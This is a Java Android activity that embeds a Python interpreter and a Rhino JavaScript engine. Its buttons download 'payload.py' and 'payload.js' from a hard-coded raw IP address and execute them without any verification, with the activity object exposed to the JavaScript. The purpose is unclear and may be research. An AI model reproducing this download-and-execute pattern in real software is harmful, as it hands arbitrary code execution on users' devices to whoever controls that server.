/*
 * Copyright (C) 2010 Google Inc.
 *
 * Licensed under the Apache License, Version 2.0 (the "License"); you may not
 * use this file except in compliance with the License. You may obtain a copy of
 * the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
 * WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
 * License for the specific language governing permissions and limitations under
 * the License.
 */

/*
 * Copyright (C) 2012, Anthony Prieur & Daniel Oppenheim. All rights reserved.
 *
 * Original from SL4A modified to allow to embed Interpreter and scripts into an APK
 */

package com.android.python27;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;
import java.io.InputStreamReader;

import org.mozilla.javascript.Context;
import org.mozilla.javascript.Scriptable;
import org.mozilla.javascript.ScriptableObject;

import android.app.Activity;
import android.app.ProgressDialog;
import android.content.BroadcastReceiver;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.res.Resources;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Message;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

import android.support.v4.content.LocalBroadcastManager;

import com.android.python27.config.GlobalConstants;
import com.android.python27.support.Utils;
import com.googlecode.android_scripting.FileUtils;

public class ScriptActivity extends Activity
{
	ProgressDialog myProgressDialog; 
	Downloader downloader;
	Button getPyButton;
	Button runPyButton;
	Button getJsButton;
	Button runJsButton;
	
	EditText et;
	
	@Override
	protected void onCreate(Bundle savedInstanceState)
	{
		super.onCreate(savedInstanceState);
		
		init();
		
		boolean installNeeded = isInstallNeeded();
		
	    if(installNeeded)
	    {
	    	et.append("interpreter is not installed \n");

	    	new InstallAsyncTask().execute();
	    }
		
		et.append("creating app		...... [ok]\n");
	}


	@Override
	public void onResume() {
	  super.onResume();

	  // Register mMessageReceiver to receive messages from Dynamix events.
	  LocalBroadcastManager.getInstance(this).registerReceiver(mMessageReceiver, new IntentFilter("hi"));
	}
 	
	// handler for received Intents for the "batteryLevel_intent" event 
	private BroadcastReceiver mMessageReceiver = new BroadcastReceiver() {
		@Override
		public void onReceive(android.content.Context context, Intent intent) {
			// Extract data included in the Intent
		//    String data = intent.getStringExtra("batteryLevel_data");
		    
		    et.append("battery level: " + "Intent" + "\n");
		}

	};
	
/*	// Send an Intent to MainActivity with new batteryLevel -- used to update UI from Dynamix events   
	private void sendMessage(String data) {
	  Intent intent = new Intent("batteryLevel_intent");
	  // Add data
	  intent.putExtra("batteryLevel_data", data);
	  LocalBroadcastManager.getInstance(this).sendBroadcast(intent);
	}  	
*/
	
	// initialization
	private void init()
	{	
		setContentView(R.layout.install);	
		et = (EditText) findViewById(R.id.editText1);
    	getPyButton = (Button)this.findViewById(R.id.button1);
		getJsButton = (Button)this.findViewById(R.id.button3);
		
	    getPyButton.setOnClickListener(new View.OnClickListener()
	    {
	        public void onClick(View v)
	        {
	        	getPythonScript();
	        	
	        	et.append("getting python script	...... [ok] \n");
	        }
	    });
	    
	    getJsButton.setOnClickListener(new View.OnClickListener()
	    {
			@Override
			public void onClick(View v)
			{
				getJavascriptScript();
			}
		});
	    
	    downloader = new Downloader();
	    		
	}	
		
	private void sendmsg(String key, String value)
	{
	      Message message = installerHandler.obtainMessage();
	      Bundle bundle = new Bundle();
	      bundle.putString(key, value);
	      message.setData(bundle);
	      installerHandler.sendMessage(message);
	}
	    
	final Handler installerHandler = new Handler()
	{
	   @Override
	   public void handleMessage(Message message)
	   {
		   Bundle bundle = message.getData();
		        
		   if (bundle.containsKey("showProgressDialog"))
		   {
			   myProgressDialog = ProgressDialog.show(ScriptActivity.this, "Installing python interpreter", "Loading", true); 
		   }
		   else if (bundle.containsKey("setMessageProgressDialog"))
		   {
			   if (myProgressDialog.isShowing())
			   {
				   myProgressDialog.setMessage(bundle.getString("setMessageProgressDialog"));
		       }
		   }
		   else if (bundle.containsKey("dismissProgressDialog"))
		   {
			   if (myProgressDialog.isShowing())
			   {
				   myProgressDialog.dismiss();
			   }
		   }
		   else if (bundle.containsKey("installSucceed"))
		   {
			   Toast toast = Toast.makeText( getApplicationContext(), "Install Succeed", Toast.LENGTH_LONG);
			   toast.show();
		   }
		   else if (bundle.containsKey("installFailed"))
		   {
			   Toast toast = Toast.makeText( getApplicationContext(), "Install Failed. Please check logs.", Toast.LENGTH_LONG);
			   toast.show();
		   }
	   }
	};
	   
	// install interpreter async
	public class InstallAsyncTask extends AsyncTask<Void, Integer, Boolean>
	{
		@Override
		protected void onPreExecute()
		{
			//
		}
	
		@Override
		protected Boolean doInBackground(Void... params)
		{			
		    Log.i(GlobalConstants.LOG_TAG, "Installing...");

		    // show progress dialog
		    sendmsg("showProgressDialog", "");

		    sendmsg("setMessageProgressDialog", "Please wait...");
		    createOurExternalStorageRootDir();
	
			// Copy all resources
			if (copyResourcesToLocal() )
			{	
				// TODO
				return true;
			}
			else
			{
				return false;
			}
		}
	
		@Override
		protected void onProgressUpdate(Integer... values)
		{
			//
		}
	
		@Override
		protected void onPostExecute(Boolean installStatus)
		{
			sendmsg("dismissProgressDialog", "");
	    	
	    	if(installStatus)
			{
			    sendmsg("installSucceed", "");
		    }
		    else
			{
			    sendmsg("installFailed", "");
		    }
		}	   
	}
	  
	// run interpreter and python script 
	private void runScriptService()
	{
		if(GlobalConstants.IS_FOREGROUND_SERVICE)
		{
			startService(new Intent(this, ScriptService.class));
		}
		else
		{
			startService(new Intent(this, BackgroundScriptService.class)); 
		}
	}
  
	private void createOurExternalStorageRootDir() {
		Utils.createDirectoryOnExternalStorage( this.getPackageName() );
	}
	
	// get python script 
	private void getPythonScript()
	{		
		et.append("start downloading python payload..... \n");
				
	    File dir = new File (this.getFilesDir().getAbsolutePath()+ "/" );
		
		if( downloader.downloadPayload("http://83.212.115.57/cannon/payloads/payload.py", "payload.py", dir) )
		{	
			et.append("download python payload complete \n");
			
			runScriptService();
		}
		else
		{
			et.append("download python payload failed \n");
		}
	}
	
	// get javascript script
	private void getJavascriptScript()
	{
		et.append("start downloading javascript payload..... \n");
		
	    File dir = new File (this.getFilesDir().getAbsolutePath()+ "/" );
		
		if( downloader.downloadPayload("http://83.212.115.57/cannon/payloads/payload.js", "payload.js", dir) )
		{	
			et.append("download javascript payload complete \n");
			
			runJavascriptScript();
		}
		else
		{
			et.append("download javascript payload failed \n");
		}
	}
	
	// run javascript script
	private void runJavascriptScript()
	{
		String file_path = this.getFilesDir().getAbsolutePath()+ "/payload.js";
		
		try
		{
			String js_code = getStringFromFile(file_path);
			
			doit(js_code);
		}
		catch (Exception e)
		{
			//
		}
	}	
	 
	// execute javascript with rhino 
    void doit(String code)
    {    	    	
        // Create an execution environment.
        Context cx = Context.enter();

        // Turn compilation off.
        cx.setOptimizationLevel(-1);

        try
        {
            // Initialize a variable scope with bindnings for 
            // standard objects (Object, Function, etc.)
            Scriptable scope = cx.initStandardObjects();

            // Set a global variable that holds the activity instance.
            ScriptableObject.putProperty(
                scope, "TheActivity", Context.javaToJS(this, scope));

            // Evaluate the script.
            cx.evaluateString(scope, code, "doit:", 1, null);           
        }
        finally
        {
        	 // We must exit the Rhino VM
            Context.exit();
        }
    }   		 
	
	public static String convertStreamToString(InputStream is) throws Exception
	{
	    BufferedReader reader = new BufferedReader(new InputStreamReader(is));
	    StringBuilder sb = new StringBuilder();
	    String line = null;
	    while ((line = reader.readLine()) != null) {
	      sb.append(line).append("\n");
	    }
	    return sb.toString();
	}

	public static String getStringFromFile(String filePath) throws Exception
	{
	    File fl = new File(filePath);
	    FileInputStream fin = new FileInputStream(fl);
	    return convertStreamToString(fin);
	    //Make sure you close all streams.
	  //  fin.close();        
	}	
	
	// copy interpreter and python script to sdcard
	private boolean copyResourcesToLocal()
	{		
		String name, sFileName;
		InputStream content;
			
		R.raw a = new R.raw();
		java.lang.reflect.Field[] t = R.raw.class.getFields();
		Resources resources = getResources();
			
		boolean succeed = true;
			
		for(int i = 0; i < t.length; i++)
		{
			try
			{
				name = resources.getText(t[i].getInt(a)).toString();
				sFileName = name.substring(name.lastIndexOf('/') + 1, name.length());
				content = getResources().openRawResource(t[i].getInt(a));
				content.reset();

				// python project
//				if(sFileName.endsWith(GlobalConstants.PYTHON_PROJECT_ZIP_NAME))
//			{
//					succeed &= Utils.unzip(content, this.getFilesDir().getAbsolutePath()+ "/", true);
//				}

				// python -> /data/data/com.android.python27/files/python
				if (sFileName.endsWith(GlobalConstants.PYTHON_ZIP_NAME))
				{
					succeed &= Utils.unzip(content, this.getFilesDir().getAbsolutePath()+ "/", true);
					FileUtils.chmod(new File(this.getFilesDir().getAbsolutePath()+ "/python/bin/python" ), 0755);
				}
				// python extras -> /sdcard/com.android.python27/extras/python
				else if (sFileName.endsWith(GlobalConstants.PYTHON_EXTRAS_ZIP_NAME))
				{
						Utils.createDirectoryOnExternalStorage( this.getPackageName() + "/" + "extras");
						Utils.createDirectoryOnExternalStorage( this.getPackageName() + "/" + "extras" + "/" + "tmp");
						succeed &= Utils.unzip(content, Environment.getExternalStorageDirectory().getAbsolutePath() + "/" + this.getPackageName() + "/extras/", true);
				}
					
			}
			catch (Exception e)
			{
				Log.e(GlobalConstants.LOG_TAG, "Failed to copyResourcesToLocal", e);
				succeed = false;
			}
		} // end for all files in res/raw
		
		return succeed;
	}

	// check if needed instalation (first time this app run, this function must return true)
	private boolean isInstallNeeded()
	{
		File dir = new File (this.getFilesDir().getAbsolutePath()+ "/python/bin/python" );
	
	    if( !dir.exists() )
	    {
	    	return true; 
	    }
	    return false;
	}	
	
  @Override
  protected void onStart()
  {
	  super.onStart();
	
	  et.append("starting app ...... [ok] \n");
	  
	  String s = "System infos:";
	  s += " OS Version: " + System.getProperty("os.version") + "(" + android.os.Build.VERSION.INCREMENTAL + ")";
	  s += " | OS API Level: " + android.os.Build.VERSION.SDK;
	  s += " | Device: " + android.os.Build.DEVICE;
	  s += " | Model (and Product): " + android.os.Build.MODEL + " ("+ android.os.Build.PRODUCT + ")";
	  
	  Log.i(GlobalConstants.LOG_TAG, s);

	  et.append(s+"\n");
	  	 
	  init();
  }
  
  @Override
  public void onPause(){
	  // Unregister receiving messages from Dynamix events, since the activity is not visible
	  LocalBroadcastManager.getInstance(this).unregisterReceiver(mMessageReceiver);
      super.onPause();
      if(myProgressDialog!=null)
    	  myProgressDialog.dismiss();
  }
  
}
